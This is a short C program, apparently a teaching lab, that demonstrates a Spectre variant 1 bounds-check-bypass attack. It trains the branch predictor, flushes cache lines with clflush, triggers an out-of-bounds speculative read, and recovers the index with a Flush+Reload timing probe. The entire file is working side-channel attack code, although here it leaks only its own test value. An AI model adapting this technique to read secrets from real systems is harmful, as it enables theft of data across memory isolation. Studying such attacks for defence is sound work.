#include<emmintrin.h>
#include<x86intrin.h>
#include<stdint.h>
#include<stdio.h>
int size = 10;
 uint8_t array[256*4096];
 uint8_t temp = 0; 
#define CACHE_HIT_THRESHOLD (90)
 #define DELTA 1024 
void victim(size_t x)
 {
 if (x < size)
 { 
temp= array[x * 4096 + DELTA];  
} }

void flushSideChannel()
{
int i;

for (i = 0; i < 256; i++) 
array[i*4096 + DELTA] = 1;

for (i = 0; i < 256; i++) 
_mm_clflush(&array[i*4096 +DELTA]);
}


void reloadSideChannel() 
{ 
int junk=0; 
register uint64_t time1, time2;
 volatile uint8_t *addr;
 int i;
 for(i = 0; i < 256; i++)
{
 addr = &array[i*4096 + DELTA];
 time1 = __rdtscp(&junk);
 junk = *addr; 
time2 = __rdtscp(&junk) - time1;
 if (time2 <= CACHE_HIT_THRESHOLD)
{
printf("array[%d*4096 + %d] is in cache.\n", i, DELTA); 
printf("The Secret = %d.\n",i); } 
} }

int main()
 { 
int i; 
flushSideChannel(); 
 for (i = 0; i < 10; i++) 
{  
_mm_clflush(&size);
 victim(i); 
 }
_mm_clflush(&size); 
for (i = 0; i < 256; i++) 
_mm_clflush(&array[i*4096 + DELTA]); 
victim(100);  
reloadSideChannel(); 
return (0);
}
